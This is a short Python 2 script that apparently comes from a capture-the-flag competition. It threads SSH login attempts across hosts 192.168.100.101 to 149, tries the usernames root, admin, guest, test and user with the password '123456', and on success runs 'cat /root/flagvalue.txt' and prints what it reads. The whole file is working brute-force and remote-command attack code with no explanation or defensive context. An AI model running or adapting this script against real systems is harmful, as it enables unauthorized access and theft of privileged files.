#!/usr/bin/env python
import paramiko
import threading
import sys
def aa(ip):
    aa=['root','admin','guest','test','user']
    for user in aa:
        try:
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,22,user,'123456',timeout=1)
            stdin,stdout,stderr=ssh.exec_command('cat /root/flagvalue.txt')
            flag=stdout.read()
            print user+':'+ip+'\n'+flag
            sys.exit(0)
        except Exception,e:
            pass
def main():
    for i in range(101,150):
        ip='192.168.100.'+str(i)
        t=threading.Thread(target=aa,args=(ip,))
        t.start()
if __name__ == '__main__':
    main()
